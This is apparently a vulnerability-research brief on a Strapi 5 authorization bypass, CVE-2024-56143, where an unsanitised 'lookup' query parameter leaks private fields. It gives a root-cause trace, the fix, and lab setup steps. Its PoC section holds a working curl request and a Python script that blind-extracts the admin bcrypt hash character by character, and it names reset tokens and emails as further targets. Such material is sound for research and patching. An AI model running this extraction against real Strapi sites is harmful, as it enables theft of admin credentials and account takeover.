# Intel Brief: CVE-2024-56143

## CVE Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2024-56143 |
| **Title** | Strapi < 5.5.2 — IDOR via `lookup` Parameter Injection |
| **Affected Software** | Strapi (headless CMS) |
| **Vendor** | Strapi Solutions SAS |
| **Affected Package** | `@strapi/core` (npm) |
| **Affected Versions** | >= 5.0.0, < 5.5.2 |
| **Patched Version** | 5.5.2 |
| **CVSS Score** | 8.2 (HIGH) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N |
| **EPSS** | 0.0% (6.1th percentile) |
| **CWE** | CWE-639 (Authorization Bypass Through User-Controlled Key) |
| **Published** | 2025-10-16 |
| **GHSA** | GHSA-495j-h493-42q2 |

## Description

The `lookup` operator in Strapi 5's document service does not properly sanitize query parameters for private fields. An **unauthenticated** attacker can access private fields — including admin passwords (bcrypt hashes) and password reset tokens — by crafting HTTP GET requests with the `lookup` query parameter.

The vulnerability is an **Insecure Direct Object Reference (IDOR)** that allows blind enumeration of sensitive field values through boolean-based inference (similar to blind SQL injection techniques, but at the ORM/query layer).

## Vulnerability Root Cause Analysis

### The Vulnerable Data Flow

```
HTTP GET /api/<content-type>?lookup[<relation>][<private_field>][$startsWith]=<guess>
  ↓
ctx.query parsed by Koa (qs library) → { lookup: { <relation>: { <private_field>: { $startsWith: <guess> } } } }
  ↓
controller.sanitizeQuery(ctx)
  → cloneDeep(query) preserves ALL properties including "lookup"
  → Only validates: filters, sort, fields, populate
  → "lookup" passes through UNSANITIZED
  ↓
entityService.findMany(uid, sanitizedQuery)
  → strapi.documents(uid).findMany(sanitizedQuery)
  ↓
documentService.findMany(params)
  → validateParams only checks: filters, sort, fields, populate
  → "lookup" parameter still in params object
  ↓
transformParamsToQuery(uid, params)
  → return assoc('where', { ...params?.lookup, ...query.where }, query)
  → USER-SUPPLIED lookup merged DIRECTLY into database WHERE clause
  ↓
strapi.db.query(uid).findMany(query)
  → Executes with attacker-controlled conditions in WHERE clause
```

### Key Vulnerable Files (v5.5.1)

1. **`packages/core/utils/src/sanitize/index.ts`** (lines 97-126)
   - `sanitizeQuery()` uses `cloneDeep(query)` preserving ALL properties
   - Only processes `filters`, `sort`, `fields`, `populate`
   - Unknown parameters like `lookup` pass through unchanged

2. **`packages/core/core/src/services/document-service/repository.ts`** (lines 44-54)
   - `validateParams()` only validates `filters`, `sort`, `fields`, `populate`
   - No check for `lookup` parameter presence

3. **`packages/core/core/src/services/document-service/transform/query.ts`** (lines 5-9)
   - **THE CRITICAL LINE**: `assoc('where', { ...params?.lookup, ...query.where }, query)`
   - Spreads `params.lookup` directly into the database WHERE clause
   - This is the injection point where user-supplied `lookup` becomes a database condition

4. **`packages/core/core/src/services/document-service/draft-and-publish.ts`** (lines 68-85)
   - `statusToLookup()` reads `params.lookup || {}` and extends it
   - Designed as an internal parameter but accessible externally

### Attack Mechanism

The attacker uses the `lookup` parameter to inject arbitrary conditions into database queries. By observing whether results are returned or not, they can perform blind enumeration of private field values:

**Example attack URL:**
```
GET /api/articles?lookup[updatedBy][password][$startsWith]=$2b$10$
```

- If the admin's bcrypt hash starts with `$2b$10$`, articles will be returned (condition matches)
- If not, no articles are returned
- By iterating character-by-character, the full hash can be extracted

**Key operators for exploitation:**
- `$startsWith` — prefix matching for character-by-character extraction
- `$contains` — substring matching
- `$eq` — exact match
- `$ne` — existence confirmation (does field have a non-null value?)

**Targetable private fields include:**
- `updatedBy.password` — admin user bcrypt password hash
- `updatedBy.resetPasswordToken` — password reset token
- `createdBy.password` — same via createdBy relation
- `createdBy.email` — admin email addresses
- Any relation field's private attributes

## Repository Details

| Field | Value |
|-------|-------|
| **Repository URL** | https://github.com/strapi/strapi.git |
| **Repository Type** | Monorepo (Yarn workspaces) |
| **Vulnerable Version Tag** | `v5.5.1` (checked out) |
| **Fix Commit** | `0c6e0953ae1e62afae9329de7ae6d6a5e21b95b8` |
| **Fix Merge PR** | #22454 (`strapi/fix/remove-lookup-docservice`) |
| **Patched Version Tag** | `v5.5.2` |
| **Primary Language** | TypeScript (Node.js) |
| **Node.js Requirement** | >= 18.0.0, <= 22.x.x |
| **Package Manager** | Yarn 4.5.0 |

## Build System

| Component | Technology |
|-----------|-----------|
| **Package Manager** | Yarn 4 (Berry) with workspaces |
| **Build Tool** | Nx (monorepo task runner) |
| **Language** | TypeScript 5.3.2 |
| **Runtime** | Node.js 18-22 |
| **Framework** | Koa.js (HTTP) |
| **Database Support** | SQLite (better-sqlite3), PostgreSQL, MySQL, MariaDB |
| **Default Database** | SQLite (via better-sqlite3 11.3.0) |

## Key Dependencies for Lab Build

For a minimal lab environment (Strapi getstarted example with SQLite):

| Package | Purpose |
|---------|---------|
| `@strapi/strapi` | Core Strapi framework |
| `@strapi/core` | Contains the vulnerable document service |
| `better-sqlite3` | Default SQLite database driver |
| `@strapi/plugin-users-permissions` | Provides public API endpoints |
| `react`, `react-dom` | Admin panel frontend |

**Recommended Lab Approach:**
Instead of building the full monorepo (which is complex), create a standalone Strapi 5.5.1 project using `npx create-strapi-app` or install specific npm packages at the vulnerable version. This is far simpler:

```bash
npx create-strapi-app@5.5.1 my-strapi-app --quickstart
# This creates a working Strapi instance with SQLite
```

Alternatively, use npm to install specific versions:
```bash
npm install @strapi/strapi@5.5.1 @strapi/plugin-users-permissions@5.5.1
```

## Fix Details

The fix (commit `0c6e0953ae`) makes two changes:

1. **`repository.ts`**: Adds a validation check that throws `ValidationError` if `params.lookup` is present:
   ```typescript
   if (params.lookup) {
     throw new errors.ValidationError("Invalid params: 'lookup'");
   }
   ```

2. **`draft-and-publish.ts`**: Adds `@ts-expect-error` annotation since `lookup` is now typed as internal-only:
   ```typescript
   // @ts-expect-error: we need to create a different typing for internal params
   const lookup = params.lookup || {};
   ```

## Public Exploits

### Exploit #82568 (Patch / Writeup)
| Field | Value |
|-------|-------|
| **Platform ID** | 82568 |
| **Classification** | writeup |
| **Attack Type** | auth_bypass |
| **Complexity** | trivial |
| **Reliability** | reliable |
| **Requires Auth** | No |
| **MITRE ATT&CK** | T1552 — Unsecured Credentials |
| **Content** | The fix patch itself (commit diff), no standalone PoC script |

**Assessment:** No ready-to-run PoC script exists in the EIP database. The exploit is classified as a "writeup" (the patch commit). However, exploitation is **trivial** — it requires only crafted HTTP GET requests with the `lookup` query parameter. A PoC script can be written from the vulnerability analysis above.

## PoC Construction Notes

A PoC should:
1. Stand up a Strapi 5.5.1 instance with at least one content type with public API access
2. Create an admin user (which sets a bcrypt password hash)
3. Create at least one content entry (so queries return results when conditions match)
4. Send crafted GET requests to the content API with `lookup` parameter targeting private fields
5. Use binary search or character-by-character enumeration to extract the password hash

**Minimal PoC request:**
```bash
# Check if admin password hash starts with "$2"
curl -s "http://localhost:1337/api/articles?lookup[createdBy][password][\$startsWith]=\$2" | jq '.data | length'
# Returns > 0 if match, 0 if no match
```

**Full extraction approach:**
```python
import requests
import string

charset = string.ascii_letters + string.digits + "./$"
base_url = "http://localhost:1337/api/articles"
known = ""

for position in range(60):  # bcrypt hash is 60 chars
    for char in charset:
        test = known + char
        params = {"lookup[createdBy][password][$startsWith]": test}
        resp = requests.get(base_url, params=params)
        if resp.json().get("data") and len(resp.json()["data"]) > 0:
            known = test
            print(f"[+] Found: {known}")
            break
```

## References

| Type | URL |
|------|-----|
| **GitHub Advisory** | https://github.com/strapi/strapi/security/advisories/GHSA-495j-h493-42q2 |
| **Fix Commit** | https://github.com/strapi/strapi/commit/0c6e0953ae1e62afae9329de7ae6d6a5e21b95b8 |
| **Fix PR** | https://github.com/strapi/strapi/pull/22454 |
| **Source Repository** | https://github.com/strapi/strapi |
| **npm Package** | https://www.npmjs.com/package/@strapi/core |
| **Strapi Documentation** | https://docs.strapi.io |

## Lab Environment Recommendations

### Fastest Path (Recommended)
Use `create-strapi-app` to scaffold a standalone vulnerable Strapi instance:
```dockerfile
FROM node:20-slim
RUN npx create-strapi-app@5.5.1 /app --quickstart --no-run
WORKDIR /app
EXPOSE 1337
CMD ["npm", "run", "develop"]
```

### Content Type Setup
After starting Strapi:
1. Complete admin registration (creates the admin user with password hash)
2. Create a content type (e.g., "Article") with at least a "title" field
3. In Settings → Roles → Public, enable "find" and "findOne" for the content type
4. Create at least one Article entry
5. The content API is now accessible at `GET /api/articles`

### Database
SQLite (default) is sufficient. No external database needed.
